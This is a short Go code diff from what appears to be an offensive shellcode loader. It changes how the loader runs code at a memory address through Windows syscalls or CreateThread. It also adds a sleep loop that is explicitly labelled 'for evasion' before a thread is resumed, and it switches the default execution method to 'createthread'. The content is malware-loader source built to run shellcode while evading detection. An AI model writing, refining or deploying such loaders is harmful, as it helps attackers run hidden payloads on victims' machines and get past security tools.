@@ -285,9 +285,15 @@ func exec(startA uintptr,funcExec string){
 			uintptr(0x00000004),
 			uintptr(0))
 		if err != syscall.Errno(0) {
-			syscall.Syscall(startA,0,0,0,0)
+			exec(startA,"syscall")
 		}else{
 			fmt.Println("Sleep 20s for evasion...")
+			go func(){
+				for i := 0; i < 100 ;i++{
+					fmt.Println("Sleep 20s for evasion...")
+					windows.SleepEx(100,false)
+				}
+			}()
 			windows.SleepEx(20000,false)
 
 			fmt.Println("ResumeThread...")
@@ -400,6 +406,6 @@ func main(){
 		SysArgs = append(SysArgs,tmpArgs[i])
 	}
 
-	//peLoader(&shellcode,"createthread")
-	peLoader(&shellcode,"syscall")
+	peLoader(&shellcode,"createthread")
+	//peLoader(&shellcode,"syscall")
 }
